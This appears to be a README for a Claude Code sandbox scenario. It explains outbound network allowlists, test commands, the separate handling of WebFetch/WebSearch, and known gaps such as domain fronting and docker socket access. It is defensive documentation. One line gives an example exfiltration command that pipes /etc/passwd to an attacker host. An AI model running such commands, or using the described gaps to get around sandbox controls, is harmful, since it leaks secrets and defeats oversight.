# Scenario 03 — Network Isolation

Demonstrates how the sandbox controls outbound network access: which domains are allowed, which are blocked, and what the defaults do. Covers both Bash-level enforcement (curl/wget via `srt`) and Claude's built-in tools (WebFetch/WebSearch).

## Config

```json
{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false,
    "network": {
      "allowedDomains": ["api.anthropic.com", "httpbin.org"],
      "deniedDomains": []
    },
    "filesystem": {
      "allowRead": [],
      "denyRead": [],
      "allowWrite": ["."],
      "denyWrite": []
    }
  }
}
```

### How network rules work

**`allowedDomains` is an allowlist.** Only domains listed here can be reached from Bash commands. Everything else is blocked. Supports wildcards — `"*.npmjs.org"` matches any subdomain.

**`deniedDomains` overrides the allowlist.** If a domain appears in both lists, it's denied. Present in the sandbox runtime but not yet documented in the official settings reference — treat as experimental.

**Default behavior (no network config):** When sandbox is enabled but no `network` section is specified, all outbound network from Bash is blocked. This is the safe default.

**`api.anthropic.com` is not auto-allowed.** Even though Claude Code needs to reach the Anthropic API, the sandbox doesn't grant that automatically. You must include it in `allowedDomains`.

**No port-level filtering.** `allowedDomains` is domain-only — there's no `"example.com:8080"` syntax. Port-specific control requires a custom proxy via `network.httpProxyPort` or `network.socksProxyPort`.

### Other network settings

| Setting | What it does | Platform |
|---|---|---|
| `network.allowLocalBinding` | Allow binding to localhost ports | macOS only |
| `network.allowUnixSockets` | Array of allowed unix socket paths | All |
| `network.allowAllUnixSockets` | Allow all unix socket connections | All |
| `network.httpProxyPort` | Use a custom HTTP proxy | All |
| `network.socksProxyPort` | Use a custom SOCKS5 proxy | All |

### The two enforcement layers

| Layer | What it controls | Configured by |
|---|---|---|
| **Sandbox (srt/Seatbelt/bubblewrap)** | Bash commands: `curl`, `wget`, `npm install`, `pip install` | `sandbox.network` in settings.json |
| **Claude's tools** | `WebFetch`, `WebSearch` — Claude's built-in HTTP/search tools | Separate permission model (not sandbox) |

A domain blocked in the sandbox can still be fetched by WebFetch. These are independent systems. See [Manual Testing](#manual-testing-webfetchwebsearch) below.

### srt vs live session: prompt vs block

There's a subtle difference between how network rules are enforced:

- **`srt` (verify.sh):** Strict deny. If a domain isn't in `allowedDomains`, the connection fails silently.
- **Live Claude session:** Unlisted domains trigger a **user prompt** — Claude asks whether to allow the connection. It's not a silent block unless `allowManagedDomainsOnly` is set (managed/enterprise settings only).

The verify script tests the strict-deny behavior. In a real session, users get a chance to approve ad-hoc domains.

## Quick Start

```bash
npm install && npm test
```

## Verify It Works

| Test | Command | Expected | Why |
|---|---|---|---|
| Allowed domain | `curl httpbin.org/get` | Succeeds | In `allowedDomains` |
| Blocked domain | `curl example.com` | Denied | Not in `allowedDomains` |
| Another blocked domain | `curl icanhazip.com` | Denied | Not in `allowedDomains` |
| Localhost access | `curl localhost:9999` | Denied | Not in `allowedDomains` |
| DNS resolution | `nslookup example.com` | Behavior varies | DNS may resolve even if HTTP is blocked |

## Manual Testing: WebFetch/WebSearch

These tests require a **live Claude Code session** (not automatable via `srt`).

Start Claude in this directory, then try:

1. **Ask Claude to fetch a blocked domain:**
   > "Use WebFetch to get https://example.com"

   Expected: Claude may attempt the fetch — WebFetch is not governed by the sandbox's `allowedDomains`. Whether it succeeds depends on Claude's own tool permissions, not the sandbox config.

2. **Ask Claude to search the web:**
   > "Use WebSearch to search for 'Claude Code sandbox'"

   Expected: WebSearch operates independently of sandbox network rules.

3. **Ask Claude to curl a blocked domain via Bash:**
   > "Run: curl https://example.com"

   Expected: Denied. Bash commands go through the sandbox, which enforces `allowedDomains`.

**The takeaway:** Sandbox network rules protect against Bash-level exfiltration (e.g., `curl attacker.com < /etc/passwd`). They do _not_ restrict Claude's own tool usage. For full network control, combine sandbox rules with tool permissions in settings.json (`allowedTools`).

## Gotchas

- **npm/pip need registry access.** If you lock down `allowedDomains` too tightly, `npm install` and `pip install` will fail. Add `registry.npmjs.org` (or `*.npmjs.org`) and `pypi.org` + `files.pythonhosted.org` to your allowlist.
- **DNS vs HTTP.** DNS lookups may succeed even when HTTP connections are blocked. The sandbox uses a proxy to filter connections — DNS resolution happens outside the sandbox. A command can resolve a domain's IP but still fail to connect.
- **Subdomains.** Use `"*.example.com"` wildcard syntax to match subdomains. A bare `"example.com"` may not match `sub.example.com`.
- **WebFetch/WebSearch are separate.** Sandbox network rules don't apply to Claude's built-in tools. This is by design — the sandbox isolates Bash, not Claude itself.
- **localhost is not special.** It's treated like any other domain — if it's not in `allowedDomains`, Bash can't reach it. This matters for Docker containers exposing ports on localhost.
- **Docker needs `excludedCommands`.** `docker` is incompatible with the sandbox. Add it to `sandbox.excludedCommands` if you need Docker access. If you also allowlist `/var/run/docker.sock` via `allowUnixSockets`, that effectively grants host-level access — be intentional. See [Scenario 11 — Excluded Commands](../11-excluded-commands/) for the full tradeoff analysis.
- **Go-based tools + TLS (macOS).** Tools like `gh`, `gcloud`, and `terraform` use Go's TLS stack, which may fail certificate verification behind the sandbox proxy. The `enableWeakerNetworkIsolation` flag works around this but reduces security.
- **Domain fronting.** The proxy filters by domain name, not content. Domain fronting can bypass network filtering — a known limitation with no current mitigation.

## Next Steps

- **[Scenario 04 — Permissions Hardening](../04-permissions-hardening/):** Lock down which tools and commands Claude can use.
- **[Scenario 06 — DevContainer Reference](../06-devcontainer-reference/):** Container-level network isolation with firewall rules.
